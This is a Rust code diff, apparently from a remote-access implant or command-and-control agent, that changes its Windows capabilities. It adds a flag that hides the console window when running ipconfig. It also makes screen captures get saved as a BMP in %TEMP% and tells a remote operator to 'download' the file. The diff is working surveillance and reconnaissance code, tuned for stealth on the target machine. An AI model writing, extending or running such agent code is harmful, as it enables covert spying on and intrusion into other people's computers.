@@ -77,8 +77,10 @@ async fn ps_windows() -> Result<String> {
 pub async fn ipconfig() -> Result<String> {
     #[cfg(target_os = "windows")]
     {
+        use std::os::windows::process::CommandExt;
         let out = tokio::process::Command::new("ipconfig")
             .args(["/all"])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
             .output().await?;
         return Ok(String::from_utf8_lossy(&out.stdout).into_owned());
     }
@@ -169,8 +171,34 @@ fn screenshot_windows() -> Result<String> {
         DeleteDC(mdc);
         ReleaseDC(0, dc);
 
-        // Return as hex-encoded raw BGRA pixels with dimensions prefix
-        Ok(format!("{}x{};{}", w, h, hex::encode(&pixels)))
+        // Build a BMP file in memory and save to %TEMP%
+        let pixel_data_size = (w * h * 4) as u32;
+        let file_size = 54u32 + pixel_data_size;
+        let mut bmp_file: Vec<u8> = Vec::with_capacity(file_size as usize);
+        // BMP file header (14 bytes)
+        bmp_file.extend_from_slice(b"BM");
+        bmp_file.extend_from_slice(&file_size.to_le_bytes());
+        bmp_file.extend_from_slice(&0u32.to_le_bytes()); // reserved
+        bmp_file.extend_from_slice(&54u32.to_le_bytes()); // pixel data offset
+        // DIB header (40 bytes)
+        bmp_file.extend_from_slice(&40u32.to_le_bytes());
+        bmp_file.extend_from_slice(&(w as i32).to_le_bytes());
+        bmp_file.extend_from_slice(&(-(h as i32)).to_le_bytes()); // top-down
+        bmp_file.extend_from_slice(&1u16.to_le_bytes());          // planes
+        bmp_file.extend_from_slice(&32u16.to_le_bytes());         // bpp
+        bmp_file.extend_from_slice(&0u32.to_le_bytes());          // BI_RGB
+        bmp_file.extend_from_slice(&pixel_data_size.to_le_bytes());
+        bmp_file.extend_from_slice(&0i32.to_le_bytes()); // X ppm
+        bmp_file.extend_from_slice(&0i32.to_le_bytes()); // Y ppm
+        bmp_file.extend_from_slice(&0u32.to_le_bytes()); // colors used
+        bmp_file.extend_from_slice(&0u32.to_le_bytes()); // colors important
+        bmp_file.extend_from_slice(&pixels);
+
+        let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Temp".into());
+        let path = format!("{}\\oxide_screen.bmp", temp);
+        std::fs::write(&path, &bmp_file)?;
+
+        Ok(format!("{}x{} screenshot saved → {}\nUse 'download {}' to retrieve it.", w, h, path, path))
     }
 }
 
